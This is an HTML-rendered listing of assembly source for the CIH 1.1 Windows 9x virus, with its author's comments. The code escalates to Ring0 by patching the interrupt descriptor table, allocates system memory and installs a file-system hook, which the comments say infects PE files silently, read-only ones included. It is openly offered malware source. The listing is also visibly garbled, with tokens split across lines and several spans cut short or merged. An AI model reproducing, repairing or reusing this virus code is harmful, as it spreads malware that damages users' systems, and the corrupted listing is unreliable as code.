<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.Win9x.CIH - CIH 1.1.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
	background: #FFFFCC;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; * The Virus Program Information * </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;**************************************************************************** </span><span class="sc0">

</span><span class="sc1">; * * </span><span class="sc0">
</span><span class="sc1">; * Designer : CIH Original Place : TTIT of Taiwan * </span><span class="sc0">
</span><span class="sc1">; * Create Date : 04/26/1998 Now Version : 1.1 * </span><span class="sc0">
</span><span class="sc1">; * Modification Time : 05/15/1998 * </span><span class="sc0">
</span><span class="sc1">; * * </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;*==========================================================================* </span><span class="sc0">

</span><span class="sc1">; * Modification History * </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;*==========================================================================* </span><span class="sc0">

</span><span class="sc1">; * v1.0 1. Create the Virus P * </span><span class="sc0">
</span><span class="sc1">; * 4. Call IFSMgr_InstallFileSystemApiHook to Hook File System. * </span><span class="sc0">
</span><span class="sc1">; * 5. Modifies Entry Point of IFSMgr_InstallFileSystemApiHook. * </span><span class="sc0">
</span><span class="sc1">; * 6. When System Opens Existing PE File, the File will be * </span><span class="sc0">
</span><span class="sc1">; * Infected, and the File doesn't be Reinfected. * </span><span class="sc0">
</span><span class="sc1">; * 7. It is also Infected, even the File is Read-Only. * </span><span class="sc0">
</span><span class="sc1">; * 8. When the File is Infected, the Modification Date and Time * </span><span class="sc0">
</span><span class="sc1">; * of the File also don't be Changed. * </span><span class="sc0">
</span><span class="sc1">; * 9. When My Virus Uses IFSMgr_Ring0_FileIO, it will not Call * </span><span class="sc0">
</span><span class="sc1">; * Previous FileSystemApiHook, it will Call the Function * </span><span class="sc0">
</span><span class="sc1">; * that the IFS Managle that be Infected will not Increase * </span><span class="sc0">
</span><span class="sc1">; * it's Size... ^__^ * </span><span class="sc0">
</span><span class="sc1">; * 05/15/1998 2. Hook and Modify Structured Exception Handing. * </span><span class="sc0">
</span><span class="sc1">; * When Exception Error Occurs, Our OS System should be in * </span><span class="sc0">
</span><span class="sc1">; * Windows NT. So My Cute Virus will not Continue to Run, * </span><span class="sc0">
</span><span class="sc1">; * it will Jmup to Original Application to Run. * </span><span class="sc0">
</span><span class="sc1">; * 3. Use Better Algorithm, Reduce Virus Code Size. * </span><span class="sc0">
</span><span class="sc1">; * 4. The Virus "Basic" Size is only 796 Bytes. * </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;**************************************************************************** </span><span class="sc0">

</span><span class="sc2">.586P</span><span class="sc0"> 

</span><span class="sc1">; ********************************************************************ALSE = </span><span class="sc0">

</span><span class="sc2">0</span><span class="sc0"> 

</span><span class="sc5">DEBUG</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">TRUE</span><span class="sc0"> 

</span><span class="sc5">MajorVirusVersion</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> 
</span><span class="sc5">MinorVirusVersion</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> 

</span><span class="sc5">VirusVersion</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">MajorVirusVersion</span><span class="sc4">*</span><span class="sc2">10h</span><span class="sc4">+</span><span class="sc5">MinorVirusVersion</span><span class="sc0"> 

</span><span class="sc5">HookExceptionNumber</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0"> 
</span><span class="sc5">FileNameBufferSize</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">7fh</span><span class="sc0"> 

</span><span class="sc1">; ********************************************************* </span><span class="sc0">
</span><span class="sc1">; ********************************************************* </span><span class="sc0">

</span><span class="sc5">VirusGame</span><span class="sc0"> </span><span class="sc9">SEGMENT</span><span class="sc0"> 

</span><span class="sc9">ASSUME</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">VirusGame</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">VirusGame</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SS</span><span class="sc4">:</span><span class="sc5">VirusGame</span><span class="sc0"> 
</span><span class="sc9">ASSUME</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:</span><span class="sc5">VirusGame</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">FS</span><span class="sc4">:</span><span class="sc5">VirusGame</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">GS</span><span class="sc4">:</span><span class="sc5">VirusGame</span><span class="sc0"> 

</span><span class="sc1">; ********************************************************* </span><span class="sc0">
</span><span class="sc1">; * Ring3 Virus Game Initial Program * </span><span class="sc0">
</span><span class="sc1">; ********************************************************* </span><span class="sc0">

</span><span class="sc5">MyVirusStart</span><span class="sc4">:</span><span class="sc0"> 
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0"> 

</span><span class="sc1">; ************************************* </span><span class="sc0">
</span><span class="sc1">; * Let's Modify Structured Exception * </span><span class="sc0">
</span><span class="sc1">; * Handing, Prevent Exception Error * </span><span class="sc0">
</span><span class="sc1">; * Occurrence, Especially in NT. * </span><span class="sc0">
</span><span class="sc1">; ************************************* </span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0"> 

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> 
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0"> 

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@0</span><span class="sc0"> 
</span><span class="sc5">@0</span><span class="sc4">:</span><span class="sc0"> 
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> 

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">StopToRunVirusCode</span><span class="sc4">-</span><span class="sc5">@0</span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0"> 
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> 

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> 

</span><span class="sc1">; ************************************* </span><span class="sc0">
</span><span class="sc1">; * Let's Modify * </span><span class="sc0">
</span><span class="sc1">; * IDT(Interrupt Descriptor Table) * </span><span class="sc0">
</span><span class="sc1">; * to Get Ring0 Privilege... * </span><span class="sc0">
</span><span class="sc1">; ************************************* </span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc6">sidt</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get IDT Base Address </span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">; </span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">HookExceptionNumber</span><span class="sc4">*</span><span class="sc2">08h</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc0"> </span><span class="sc1">; ZF = 0 </span><span class="sc0">

</span><span class="sc6">cli</span><span class="sc0"> 

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get Exception Base </span><span class="sc0">
</span><span class="sc8">ebx</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0"> </span><span class="sc1">; Modify Exception </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc1">; Entry Point Address </span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> 

</span><span class="sc1">; ************************************* </span><span class="sc0">
</span><span class="sc1">; * Generate Exception to Get Ring0 * </span><span class="sc0">
</span><span class="sc1">; ************************************* </span><span class="sc0">

</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">HookExceptionNumber</span><span class="sc0"> </span><span class="sc1">; GenerateException </span><span class="sc0">
</span><span class="sc5">ReturnAddressOfEndException</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> 

</span><span class="sc1">; ************************************* </span><span class="sc0">
</span><span class="sc1">; * Merge All Virus Code Section * </span><span class="sc0">
</span><span class="sc1">; ************************************* </span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> 
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> 

</span><span class="sc5">LoopOfMergeAllVirusCodeSection</span><span class="sc4">:</span><span class="sc0"> 

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0"> 

</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0"> 

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc0"> 

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0"> 

</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> 
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">QuitLoopOfMergeAllVirusCodeSection</span><span class="sc0"> </span><span class="sc1">; ZF = 1 </span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">LoopOfMergeAllVirusCodeSection</span><span class="sc0"> 

</span><span class="sc5">QuitLoopOfMergeAllVirusCodeSection</span><span class="sc4">:</span><span class="sc0"> 

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> 

</span><span class="sc1">; ************************************* </span><span class="sc0">
</span><span class="sc1">; * Generate Exception Again * </span><span class="sc0">
</span><span class="sc1">; ************************************* </span><span class="sc0">

</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">HookExceptionNumber</span><span class="sc0"> </span><span class="sc1">; GenerateException Ag </span><span class="sc0">
</span><span class="sc5">ain</span><span class="sc0"> 

</span><span class="sc1">; ************************************* </span><span class="sc0">
</span><span class="sc1">; * Let's Restore * </span><span class="sc0">
</span><span class="sc1">; * Structured Exception Handing * </span><span class="sc0">
</span><span class="sc1">; ************************************* </span><span class="sc0">

</span><span class="sc5">ReadyRestoreSE</span><span class="sc4">:</span><span class="sc0"> 
</span><span class="sc6">sti</span><span class="sc0"> 

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> 

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">RestoreSE</span><span class="sc0"> 

</span><span class="sc1">; ************************************* </span><span class="sc0">
</span><span class="sc1">; * When Exception Error Occurs, * </span><span class="sc0">
</span><span class="sc1">; * Our OS System should be in NT. * </span><span class="sc0">
</span><span class="sc1">; * So My Cute Virus will not * </span><span class="sc0">
</span><span class="sc1">; * Continue to Run, it Jmups to * </span><span class="sc0">
</span><span class="sc1">; * Original Application to Run. * </span><span class="sc0">
</span><span class="sc1">; ************************************* </span><span class="sc0">

</span><span class="sc5">StopToRunVirusCode</span><span class="sc4">:</span><span class="sc0"> 
</span><span class="sc5">@1</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">StopToRunVirusCode</span><span class="sc0"> 

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> 
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0"> 
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0"> 

</span><span class="sc5">RestoreSE</span><span class="sc4">:</span><span class="sc0"> 
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0"> 
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> 

</span><span class="sc1">; ************************************* </span><span class="sc0">
</span><span class="sc1">; * Return Original App to Execute * </span><span class="sc0">
</span><span class="sc1">; ************************************* </span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0"> 

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00401000h</span><span class="sc0"> </span><span class="sc1">; Push Original </span><span class="sc0">
</span><span class="sc5">OriginalAddressOfEntryPoint</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">; App Entry Point to Stack </span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc1">; Re********************************* </span><span class="sc0">

</span><span class="sc5">MyExceptionHook</span><span class="sc4">:</span><span class="sc0"> 
</span><span class="sc5">@2</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">MyExceptionHook</span><span class="sc0"> 

</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">InstallMyFileSystemApiHook</span><span class="sc0"> 

</span><span class="sc1">; ************************************* </span><span class="sc0">
</span><span class="sc1">; * Do My Virus Exist in System !? * </span><span class="sc0">
</span><span class="sc1">; ************************************* </span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dr0</span><span class="sc0"> 
</span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">AllocateSystemMemoryPage</span><span class="sc0"> 

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">ReadyRestoreSE</span><span class="sc4">-</span><span class="sc5">ReturnAddressO</span><span class="sc0"> 
</span><span class="sc5">fEndException</span><span class="sc0"> 

</span><span class="sc1">; ************************************* </span><span class="sc0">
</span><span class="sc1">; * Return to Ring3 Initial Program * </span><span class="sc0">
</span><span class="sc1">; ************************************* </span><span class="sc0">

</span><span class="sc5">ExitRing0Init</span><span class="sc4">:</span><span class="sc0"> 
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0"> </span><span class="sc1">; Restore Exception </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc1">; </span><span class="sc0">

</span><span class="sc6">iretd</span><span class="sc0"> 

</span><span class="sc1">; ************************************* </span><span class="sc0">
</span><span class="sc1">; * Allocate SystemMemory Page to Use * </span><span class="sc0">
</span><span class="sc1">; ************************************* </span><span class="sc0">

</span><span class="sc5">AllocateSystemMemoryPage</span><span class="sc4">:</span><span class="sc0"> 

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dr0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">; Set the Mark of My Virus Exi </span><span class="sc0">
</span><span class="sc8">st</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">System</span><span class="sc0"> 

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000fh</span><span class="sc0"> </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0ffffffffh</span><span class="sc0"> </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">000000001h</span><span class="sc0"> </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">000000002h</span><span class="sc0"> </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc1">; VMMCALL _PageAllocate </span><span class="sc0">
</span><span class="sc5">_PageAllocate</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00010053h</span><span class="sc0"> </span><span class="sc1">; Use EAX, ECX, EDX, and flags </span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc0"> 

</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; EDI = SystemMemory Start Add </span><span class="sc0">
</span><span class="sc5">ress</span><span class="sc0"> 

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MyVirusStart</span><span class="sc4">-</span><span class="sc5">@2</span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0"> 

</span><span class="sc6">iretd</span><span class="sc0"> </span><span class="sc1">; Return to Ring3 Initial Program </span><span class="sc0">

</span><span class="sc1">; ************************************* </span><span class="sc0">
</span><span class="sc1">; * Install My File System Api Hook * </span><span class="sc0">
</span><span class="sc1">; ************************0h ; VXDCALL IFSMgr_InstallFileSystemApiHook </span><span class="sc0">
</span><span class="sc5">IFSMgr_InstallFileSystemApiHook</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00400067h</span><span class="sc0"> </span><span class="sc1">; Use EAX, ECX, EDX, and flags </span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dr0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Save OldFileSystemApiHook Ad </span><span class="sc0">
</span><span class="sc5">dress</span><span class="sc0"> 

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; EAX = FileSystemApiHook Address </span><span class="sc0">

</span><span class="sc1">; Save Old IFSMgr_InstallFileSystemApiHook Entry Point </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IFSMgr_InstallFileSystemApiHook</span><span class="sc4">-</span><span class="sc5">@2</span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0"> 
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0"> 
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">OldInstallFileSystemApiHook</span><span class="sc4">-</span><span class="sc5">@3</span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> 

</span><span class="sc1">; Modify IFSMgr_InstallFileSystemApiHook Entry Point </span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">InstallFileSystemApiHook</span><span class="sc4">-</span><span class="sc5">@3</span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0"> 
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> 

</span><span class="sc6">cli</span><span class="sc0"> 

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExitRing0Init</span><span class="sc0"> 

</span><span class="sc1">; ********************************************************* </span><span class="sc0">
</span><span class="sc1">; * Code Size of Merge Virus Code Section * </span><span class="sc0">
</span><span class="sc1">; ********************************************************* </span><span class="sc0">

</span><span class="sc5">CodeSizeOfMergeVirusCodeSection</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> 

</span><span class="sc1">; ********************************************************* </span><span class="sc0">
</span><span class="sc1">; * IFSMgr_InstallFileSystemApiHook * </span><span class="sc0">
</span><span class="sc1">; ********************************************************* </span><span class="sc0">

</span><span class="sc5">InstallFileSystemApiHook</span><span class="sc4">:</span><span class="sc0"> 
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> 

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@4</span><span class="sc0"> </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc5">@4</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">; mov ebx, offset FileSystemApiHook </span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FileSystemApiHook</span><span class="sc4">-</span><span class="sc5">@4</span><span class="sc0"> </span><span class="sc1">; </span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> 
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc1">; VXDCALL IFSMgr_RemoveFileSystemApiHook </span><span class="sc0">
</span><span class="sc5">IFSMgr_RemoveFileSystemApiHook</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> 
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00400068h</span><span class="sc0"> </span><span class="sc1">; Use EAX, ECX, EDX, and flags </span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> 

</span><span class="sc1">; Call Original IFSMgr_InstallFileSystemApiHook </span><span class="sc0">
</span><span class="sc1">; to Link Client FileSystemApiHook </span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0"> 
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OldInstallFileSystemApiHook</span><span class="sc4">-</span><span class="sc5">@3</span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0"> 
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> 

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> 

</span><span class="sc1">; Call Original IFSMgr_InstallFileSystemApiHook </span><span class="sc0">
</span><span class="sc4">******</span><span class="sc0"> 
</span><span class="sc1">; * Static Data * </span><span class="sc0">
</span><span class="sc1">; ********************************************************* </span><span class="sc0">

</span><span class="sc5">OldInstallFileSystemApiHook</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> 

</span><span class="sc1">; ********************************************************* </span><span class="sc0">
</span><span class="sc1">; * IFSMgr_FileSystemHook * </span><span class="sc0">
</span><span class="sc1">; ********************************************************* </span><span class="sc0">

</span><span class="sc1">; ************************************* </span><span class="sc0">
</span><span class="sc1">; * IFSMgr_FileSystemHook Entry Point * </span><span class="sc0">
</span><span class="sc1">; ************************************* </span><span class="sc0">

</span><span class="sc5">FileSystemApiHook</span><span class="sc4">:</span><span class="sc0"> 
</span><span class="sc5">@3</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">FileSystemApiHook</span><span class="sc0"> 

</span><span class="sc6">pushad</span><span class="sc0"> 

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@5</span><span class="sc0"> </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc5">@5</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc1">; mov esi, offset VirusGameDataStartAd </span><span class="sc0">
</span><span class="sc5">dress</span><span class="sc0"> 
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VirusGameDataStartAddress</span><span class="sc4">-</span><span class="sc5">@5</span><span class="sc0"> 

</span><span class="sc1">; ************************************* </span><span class="sc0">
</span><span class="sc1">; * Is OnBusy !? * </span><span class="sc0">
</span><span class="sc1">; ************************************* </span><span class="sc0">

</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">OnBusy</span><span class="sc4">-</span><span class="sc5">@6</span><span class="sc4">)[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0"> </span><span class="sc1">; if ( OnBusy </span><span class="sc0">
</span><span class="sc4">)</span><span class="sc0"> 
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">pIFSFunc</span><span class="sc0"> </span><span class="sc1">; goto pIFSFun </span><span class="sc0">
